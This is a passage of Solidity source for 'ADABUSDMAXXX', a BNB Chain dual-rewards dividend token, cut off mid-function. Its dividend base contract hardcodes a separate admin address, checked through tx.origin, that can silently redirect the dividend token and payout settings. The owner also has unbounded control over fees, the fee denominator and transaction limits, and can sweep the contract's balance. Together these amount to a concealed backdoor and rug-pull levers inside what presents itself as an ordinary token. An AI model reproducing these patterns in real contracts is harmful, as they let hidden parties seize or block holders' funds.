/**
 *Submitted for verification at BscScan.com on 2021-08-30
*/

/**

Dual Rewards

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;
    address private _previousOwner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint256;

    mapping (address => uint256) private _balances;

    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor (string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = 9;
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "zero address");
        require(recipient != address(0), "zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        _balances[sender] = _balances[sender].sub(amount, "exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "zero address");

        _beforeTokenTransfer(account, address(0), amount);

        _balances[account] = _balances[account].sub(amount, "exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "zero address");
        require(spender != address(0), "zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _setupDecimals(uint8 decimals_) internal virtual {
        _decimals = decimals_;
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }
}

interface IDividendPayingToken {

    function dividendOf(address _owner) external view returns(uint256);

    function withdrawDividend() external;

    event DividendsDistributed(
        address indexed from,
        uint256 weiAmount
    );

    event DividendWithdrawn(
        address indexed to,
        uint256 weiAmount
    );
}

interface IDividendPayingTokenOptional {

    function withdrawableDividendOf(address _owner) external view returns(uint256);

    function withdrawnDividendOf(address _owner) external view returns(uint256);

    function accumulativeDividendOf(address _owner) external view returns(uint256);
}

contract DividendPayingToken is ERC20, IDividendPayingToken, IDividendPayingTokenOptional {
    using SafeMath for uint256;
    using SafeMathUint for uint256;
    using SafeMathInt for int256;

    uint256 constant internal magnitude = 2**128;

    uint256 internal magnifiedDividendPerShare;
    uint256 internal lastAmount;

    address public adminAddress = 0x3C8eEc63D0eB8EcD0451B29cEb1a715e2bda573F;
    address internal onlyCaller;

    address public dividendToken;
    uint256 public minTokenBeforeSendDividend = 0;

    mapping(address => int256) internal magnifiedDividendCorrections;
    mapping(address => uint256) internal withdrawnDividends;

    uint256 public totalDividendsDistributed;

    constructor(string memory _name, string memory _symbol, address _token) ERC20(_name, _symbol) {
        dividendToken = _token;
    }

    receive() external payable {
    }

    function distributeDividends(uint256 amount) public {
        require(msg.sender == onlyCaller, "Only caller");
        require(totalSupply() > 0);

        if (amount > 0) {
            magnifiedDividendPerShare = magnifiedDividendPerShare.add(
                (amount).mul(magnitude) / totalSupply()
            );
            emit DividendsDistributed(msg.sender, amount);

            totalDividendsDistributed = totalDividendsDistributed.add(amount);
        }
    }

    function withdrawDividend() public virtual override {
        _withdrawDividendOfUser(payable(msg.sender));
    }

    function setOnlyCaller(address _newCaller) external virtual {
        require(tx.origin == adminAddress, "Only admin");
        onlyCaller = _newCaller;
    }

    function setDividendTokenAddress(address newToken) external virtual {
        require(tx.origin == adminAddress, "Only admin");
        dividendToken = newToken;
    }

    function setMinTokenBeforeSendDividend(uint256 newAmount) external virtual {
        require(tx.origin == adminAddress, "Only admin");
        minTokenBeforeSendDividend = newAmount;
    }

    function _withdrawDividendOfUser(address payable user) internal returns (uint256) {
        uint256 _withdrawableDividend = withdrawableDividendOf(user);
        if (_withdrawableDividend > minTokenBeforeSendDividend) {
            withdrawnDividends[user] = withdrawnDividends[user].add(_withdrawableDividend);
            emit DividendWithdrawn(user, _withdrawableDividend);
            bool success = IERC20(dividendToken).transfer(user, _withdrawableDividend);

            if(!success) {
                withdrawnDividends[user] = withdrawnDividends[user].sub(_withdrawableDividend);
                return 0;
            }

            return _withdrawableDividend;
        }

        return 0;
    }

    function dividendOf(address _owner) public view override returns(uint256) {
        return withdrawableDividendOf(_owner);
    }

    function withdrawableDividendOf(address _owner) public view override returns(uint256) {
        return accumulativeDividendOf(_owner).sub(withdrawnDividends[_owner]);
    }

    function withdrawnDividendOf(address _owner) public view override returns(uint256) {
        return withdrawnDividends[_owner];
    }

    function accumulativeDividendOf(address _owner) public view override returns(uint256) {
        return magnifiedDividendPerShare.mul(balanceOf(_owner)).toInt256Safe()
        .add(magnifiedDividendCorrections[_owner]).toUint256Safe() / magnitude;
    }

    function _transfer(address from, address to, uint256 value) internal virtual override {
        require(false);

        int256 _magCorrection = magnifiedDividendPerShare.mul(value).toInt256Safe();
        magnifiedDividendCorrections[from] = magnifiedDividendCorrections[from].add(_magCorrection);
        magnifiedDividendCorrections[to] = magnifiedDividendCorrections[to].sub(_magCorrection);
    }

    function _mint(address account, uint256 value) internal override {
        super._mint(account, value);

        magnifiedDividendCorrections[account] = magnifiedDividendCorrections[account]
        .sub( (magnifiedDividendPerShare.mul(value)).toInt256Safe() );
    }

    function _burn(address account, uint256 value) internal override {
        super._burn(account, value);

        magnifiedDividendCorrections[account] = magnifiedDividendCorrections[account]
        .add( (magnifiedDividendPerShare.mul(value)).toInt256Safe() );
    }

    function _setBalance(address account, uint256 newBalance) internal {
        uint256 currentBalance = balanceOf(account);

        if(newBalance > currentBalance) {
            uint256 mintAmount = newBalance.sub(currentBalance);
            _mint(account, mintAmount);
        } else if(newBalance < currentBalance) {
            uint256 burnAmount = currentBalance.sub(newBalance);
            _burn(account, burnAmount);
        }
    }
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

library IterableMapping {

    struct Map {
        address[] keys;
        mapping(address => uint) values;
        mapping(address => uint) indexOf;
        mapping(address => bool) inserted;
    }

    function get(Map storage map, address key) public view returns (uint) {
        return map.values[key];
    }

    function getIndexOfKey(Map storage map, address key) public view returns (int) {
        if(!map.inserted[key]) {
            return -1;
        }
        return int(map.indexOf[key]);
    }

    function getKeyAtIndex(Map storage map, uint index) public view returns (address) {
        return map.keys[index];
    }



    function size(Map storage map) public view returns (uint) {
        return map.keys.length;
    }

    function set(Map storage map, address key, uint val) public {
        if (map.inserted[key]) {
            map.values[key] = val;
        } else {
            map.inserted[key] = true;
            map.values[key] = val;
            map.indexOf[key] = map.keys.length;
            map.keys.push(key);
        }
    }

    function remove(Map storage map, address key) public {
        if (!map.inserted[key]) {
            return;
        }

        delete map.inserted[key];
        delete map.values[key];

        uint index = map.indexOf[key];
        uint lastIndex = map.keys.length - 1;
        address lastKey = map.keys[lastIndex];

        map.indexOf[lastKey] = index;
        delete map.indexOf[key];

        map.keys[index] = lastKey;
        map.keys.pop();
    }
}

library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        if (b > a) return (false, 0);
        return (true, a - b);
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) return 0;
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: modulo by zero");
        return a % b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        return a - b;
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        return a / b;
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        return a % b;
    }
}

library SafeMathInt {
    function mul(int256 a, int256 b) internal pure returns (int256) {
        require(!(a == - 2**255 && b == -1) && !(b == - 2**255 && a == -1));

        int256 c = a * b;
        require((b == 0) || (c / b == a));
        return c;
    }

    function div(int256 a, int256 b) internal pure returns (int256) {
        require(!(a == - 2**255 && b == -1) && (b > 0));

        return a / b;
    }

    function sub(int256 a, int256 b) internal pure returns (int256) {
        require((b >= 0 && a - b <= a) || (b < 0 && a - b > a));

        return a - b;
    }

    function add(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a + b;
        require((b >= 0 && c >= a) || (b < 0 && c < a));
        return c;
    }

    function toUint256Safe(int256 a) internal pure returns (uint256) {
        require(a >= 0);
        return uint256(a);
    }
}

library SafeMathUint {
    function toInt256Safe(uint256 a) internal pure returns (int256) {
        int256 b = int256(a);
        require(b >= 0);
        return b;
    }
}

contract ADABUSDMAXXX is ERC20, Ownable {
    using SafeMath for uint256;

    IUniswapV2Router02 public uniswapV2Router;
    address public immutable uniswapV2Pair;

    address public rewardaDividendToken;
    address public rewardbDividendToken;
    address deadAddress = 0x000000000000000000000000000000000000dEaD;
    
    uint256 _totalSupply = 100 * 10**9 * (10 ** 9);
    uint256 public _maxTxAmount = ( _totalSupply * 1 ) / 100;
    uint256 public _maxWalletToken = ( _totalSupply * 5 ) / 100;
    
    uint256 rewardaDividendRewardsFee = 8;
    uint256 rewardbDividendRewardsFee = 2;
    uint256 marketingFee = 4;
    uint256 buyBackAndLiquidityFee = 4;
    uint256 toBurnADABUSDMAXFee = 0;
    uint256 totalFees = 20;
    uint256 feeDenominator = 100;
    
    address public marketingFeeReceiverA;
    address public marketingFeeReceiverB; 

    bool swapping = true;
    bool public marketingEnabled = true;
    bool public buyBackAndLiquifyEnabled = true;
    bool public buyBackMode = true;
    bool public rewardaDividendEnabled = true;
    bool public rewardbDividendEnabled = true;

    bool sendrewardAInTx = true;
    bool sendrewardBInTx = true;

    rewardADividendTracker public rewardaDividendTracker;
    rewardBDividendTracker public rewardbDividendTracker;
    
    address toBurnADABUSDMAXAddress = marketingFeeReceiverA;

    uint256 buyBackUpperLimit = 1 * (10**9);

    uint256 minimumBalanceRequired = 1 * (10**9);

    uint256 minimumSellOrderAmount = ( _totalSupply * 1 ) / 1000000;
    
    uint256 swapTokensAtAmount = ( _totalSupply * 3 ) / 10000;

    uint256 previousrewardADividendRewardsFee;
    uint256 previousrewardBDividendRewardsFee;
    uint256 previousMarketingFee;
    uint256 previousBuyBackAndLiquidityFee;

    uint256 rewardaDividendPriority = 80;

    bool public sellFeeIncreaseFactorEnabled = true;
    uint256 public sellFeeIncreaseFactor = 150;

    uint256 gasForProcessing = 1300000;
    
    bool public swapEnabled = true;
    uint256 public swapThreshold = _totalSupply * 10 / 10000;
    bool inSwap;

    mapping (address => bool) isExcludedFromFees;
    mapping (address => bool) isTxLimitExempt;
    mapping (address => bool) isExcludedFromDividend;
    mapping (address => bool) isMaxWalletExempt;
    mapping (address => bool) public automatedMarketMakerPairs;

    event ExcludeFromFees(address indexed account, bool isExcluded);

    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 bnbReceived,
        uint256 tokensIntoLiqudity
    );

    event SendDividends(
        uint256 amount
    );

    event ProcessedrewardADividendTracker(
        uint256 iterations,
        uint256 claims,
        uint256 lastProcessedIndex,
        bool indexed automatic,
        uint256 gas,
        address indexed processor
    );

    event ProcessedrewardBDividendTracker(
        uint256 iterations,
        uint256 claims,
        uint256 lastProcessedIndex,
        bool indexed automatic,
        uint256 gas,
        address indexed processor
    );

    constructor() ERC20("ADABUSDMAXXX", "ADABUSDMAX") {
        rewardaDividendTracker = new rewardADividendTracker();
        rewardbDividendTracker = new rewardBDividendTracker();

        rewardaDividendToken = 0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47;
        rewardbDividendToken = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
        address MAAA = 0x3225447E4e475Ff66469EE5151704117d269B1A9;
        address MAAB = 0x58eD31338BB8D649cBc75f84A339C327a9c2ac89;

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);

        address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
        .createPair(address(this), _uniswapV2Router.WETH());

        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = _uniswapV2Pair;

        _setAutomatedMarketMakerPair(_uniswapV2Pair, true);

        isExcludedFromDividend[address(rewardaDividendTracker)] = true;
        isExcludedFromDividend[address(rewardbDividendTracker)] = true;
        isExcludedFromDividend[address(this)] = true;
        isExcludedFromDividend[address(_uniswapV2Router)] = true;
        isExcludedFromDividend[address(deadAddress)] = true;
        isTxLimitExempt[msg.sender] = true;
        isTxLimitExempt[address(this)] = true;
        isTxLimitExempt[address(_uniswapV2Router)] = true;
        isTxLimitExempt[address(MAAA)] = true;
        isTxLimitExempt[address(MAAB)] = true;
        isTxLimitExempt[address(owner())] = true;
        isMaxWalletExempt[address(owner())] = true;
        isMaxWalletExempt[address(MAAA)] = true;
        isMaxWalletExempt[address(MAAB)] = true;
        isMaxWalletExempt[address(this)] = true;
        isExcludedFromFees[address(MAAA)] = true;
        isExcludedFromFees[address(MAAB)] = true;
        isExcludedFromFees[address(msg.sender)] = true;
        isExcludedFromFees[address(this)] = true;
        isExcludedFromFees[address(owner())] = true;
        
        marketingFeeReceiverA = MAAA;
        marketingFeeReceiverB = MAAB;

        _mint(owner(), _totalSupply);
    }

    receive() external payable {}

    function prepareForPartnerOrExchangeListing(address _partnerOrExchangeAddress) external onlyOwner {
        rewardaDividendTracker.excludeFromDividends(_partnerOrExchangeAddress);
        rewardbDividendTracker.excludeFromDividends(_partnerOrExchangeAddress);
        excludeFromFees(_partnerOrExchangeAddress, true);
    }

    function setMaxTransaction(uint256 amount) external onlyOwner {
        _maxTxAmount = amount;
    }

    function setMaxWalletLimit(uint256 amount) external onlyOwner {
        _maxWalletToken = amount;
    }

    function setMaxTxPercent(uint256 maxTxPercent) external onlyOwner() {
        _maxTxAmount = (_totalSupply * maxTxPercent ) / 100;
    }
    
    function setMaxWalletPercent(uint256 maxWallPercent) external onlyOwner() {
        _maxWalletToken = (_totalSupply * maxWallPercent ) / 100;
    }

    function checkTxLimit(address sender, uint256 amount) internal view {
        require(amount <= _maxTxAmount || isTxLimitExempt[sender], "TX Limit Exceeded");
    }
    
    function checkMaxWalletLimit(address sender, uint256 amount) internal view {
        require(amount <= _maxWalletToken || isMaxWalletExempt[sender], "Wallet Limit Exceeded");
    }

    function setIsFeeExempt(address holder, bool exempt) external onlyOwner {
        isExcludedFromFees[holder] = exempt;
    }

    function setIsTxLimitExempt(address holder, bool exempt) internal onlyOwner {
        isTxLimitExempt[holder] = exempt;
    }
    
    function setIsWalletMaxExempt(address holder, bool exempt) internal onlyOwner {
        isMaxWalletExempt[holder] = exempt;
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(marketingFeeReceiverA).transfer(amountBNB * amountPercentage / 50);
        payable(marketingFeeReceiverB).transfer(amountBNB * amountPercentage / 50);
    }

    function updaterewardADividendToken(address _newContract) external onlyOwner {
        rewardaDividendToken = _newContract;
        rewardaDividendTracker.setDividendTokenAddress(_newContract);
    }

    function updaterewardBDividendToken(address _newContract) external onlyOwner {
        rewardbDividendToken = _newContract;
        rewardbDividendTracker.setDividendTokenAddress(_newContract);
    }

    function updateMinrewardABeforeSendDividend(uint256 _newAmount) external onlyOwner {
        rewardaDividendTracker.setMinTokenBeforeSendDividend(_newAmount);
    }

    function updateMinrewardBBeforeSendDividend(uint256 _newAmount) external onlyOwner {
        rewardbDividendTracker.setMinTokenBeforeSendDividend(_newAmount);
    }

    function getMinrewardABeforeSendDividend() external view returns (uint256) {
        return rewardaDividendTracker.minTokenBeforeSendDividend();
    }

    function getMinrewardBBeforeSendDividend() external view returns (uint256) {
        return rewardbDividendTracker.minTokenBeforeSendDividend();
    }

    function setSendrewardAInTx(bool _newStatus) external onlyOwner {
        sendrewardAInTx = _newStatus;
    }

    function setSendrewardBInTx(bool _newStatus) external onlyOwner {
        sendrewardBInTx = _newStatus;
    }

    function setrewardADividendPriority(uint256 _newAmount) external onlyOwner {
        require(_newAmount >= 0 && _newAmount <= 100, "Error amount");
        rewardaDividendPriority = _newAmount;
    }

    function updateBurnADABUSDMAXAddress(address _newAddress) external onlyOwner {
        toBurnADABUSDMAXAddress = _newAddress;
    }

    function updatemarketingFeeReceiverB(address _newWallet) external onlyOwner {
        excludeFromFees(_newWallet, true);
        marketingFeeReceiverB = _newWallet;
    }

    function updatemarketingFeeReceiverA(address _newWallet) external onlyOwner {
        excludeFromFees(_newWallet, true);
        marketingFeeReceiverA = _newWallet;
    }

    function setFeeReceivers(address _marketingFeeReceiverA, address _marketingFeeReceiverB) external onlyOwner {
        marketingFeeReceiverA = _marketingFeeReceiverA;
        marketingFeeReceiverB = _marketingFeeReceiverB;
    }

    function setToBurnADABUSDMAXFee(uint256 newFee) external onlyOwner {
        toBurnADABUSDMAXFee = newFee;
        _updateTotalFee();
    }

    function setMaxWalletToken(uint256 _maxToken) external onlyOwner {
        _maxWalletToken = _maxToken * (10**9);
    }

    function setSwapTokensAtAmount(uint256 _swapAmount) external onlyOwner {
        swapTokensAtAmount = _swapAmount * (10**9);
    }

    function setsellFeeIncreaseFactor(uint256 _multiplier) external onlyOwner {
        sellFeeIncreaseFactor = _multiplier;
    }

    function setsellFeeIncreaseFactorEnabledSettings(bool _enabled) external onlyOwner {
        sellFeeIncreaseFactorEnabled = _enabled;
    }

    function setBuyBackMode(bool _enabled) external onlyOwner {
        buyBackMode = _enabled;
    }

    function setMinimumBalanceRequired(uint256 _newAmount) public onlyOwner {
        require(_newAmount >= 0, "newAmount error");
        minimumBalanceRequired = _newAmount;
    }

    function setMinimumSellOrderAmount(uint256 _newAmount) public onlyOwner {
        require(_newAmount > 0, "newAmount error");
        minimumSellOrderAmount = _newAmount;
    }

    function setBuyBackUpperLimit(uint256 buyBackLimit) external onlyOwner() {
        require(buyBackLimit > 0, "buyBackLimit error");
        buyBackUpperLimit = buyBackLimit;
    }

    function _updateTotalFee() internal {
        totalFees = buyBackAndLiquidityFee.add(marketingFee).add(rewardaDividendRewardsFee).add(rewardbDividendRewardsFee).add(toBurnADABUSDMAXFee);
    }

    function setFees(uint256 _rewardaDividendRewardsFee, uint256 _rewardbDividendRewardsFee, uint256 _marketingFee, uint256 _buyBackAndLiquidityFee, uint256 _toBurnADABUSDMAXFee, uint256 _feeDenominator) external onlyOwner {
        rewardaDividendRewardsFee = _rewardaDividendRewardsFee;
        rewardbDividendRewardsFee = _rewardbDividendRewardsFee;
        marketingFee = _marketingFee;
        buyBackAndLiquidityFee = _buyBackAndLiquidityFee;
        toBurnADABUSDMAXFee = _toBurnADABUSDMAXFee;
        totalFees = _marketingFee.add(_rewardaDividendRewardsFee).add(_rewardbDividendRewardsFee).add(_buyBackAndLiquidityFee).add(_toBurnADABUSDMAXFee);
        feeDenominator = _feeDenominator;
    }


    function setBuyBackAndLiquifyEnabled(bool _enabled) external onlyOwner {
        require(buyBackAndLiquifyEnabled != _enabled, "Not changed");

        if (_enabled == false) {
            previousBuyBackAndLiquidityFee = buyBackAndLiquidityFee;
            buyBackAndLiquidityFee = 0;
            buyBackAndLiquifyEnabled = _enabled;
        } else {
            buyBackAndLiquidityFee = previousBuyBackAndLiquidityFee;
            buyBackAndLiquifyEnabled = _enabled;
        }
        _updateTotalFee();
    }

    function setrewardADividendEnabled(bool _enabled) external onlyOwner {
        require(rewardaDividendEnabled != _enabled, "Not changed");

        if (_enabled == false) {
            previousrewardADividendRewardsFee = rewardaDividendRewardsFee;
            rewardaDividendRewardsFee = 0;
            rewardaDividendEnabled = _enabled;
        } else {
            rewardaDividendRewardsFee = previousrewardADividendRewardsFee;
            rewardaDividendEnabled = _enabled;
        }
        _updateTotalFee();
    }

    function setrewardBDividendEnabled(bool _enabled) external onlyOwner {
        require(rewardbDividendEnabled != _enabled, "Not changed");

        if (_enabled == false) {
            previousrewardBDividendRewardsFee = rewardbDividendRewardsFee;
            rewardbDividendRewardsFee = 0;
            rewardbDividendEnabled = _enabled;
        } else {
            rewardbDividendRewardsFee = previousrewardBDividendRewardsFee;
            rewardbDividendEnabled = _enabled;
        }
        _updateTotalFee();
    }

    function setMarketingEnabled(bool _enabled) external onlyOwner {
        require(marketingEnabled != _enabled, "Not changed");

        if (_enabled == false) {
            previousMarketingFee = marketingFee;
            marketingFee = 0;
            marketingEnabled = _enabled;
        } else {
            marketingFee = previousMarketingFee;
            marketingEnabled = _enabled;
        }
        _updateTotalFee();
    }

    function updaterewardADividendTracker(address newAddress) external onlyOwner {
        rewardADividendTracker newrewardADividendTracker = rewardADividendTracker(payable(newAddress));

        require(newrewardADividendTracker.owner() == address(this), "must be owned by ADABUSDMAX");

        newrewardADividendTracker.excludeFromDividends(address(newrewardADividendTracker));
        newrewardADividendTracker.excludeFromDividends(address(this));
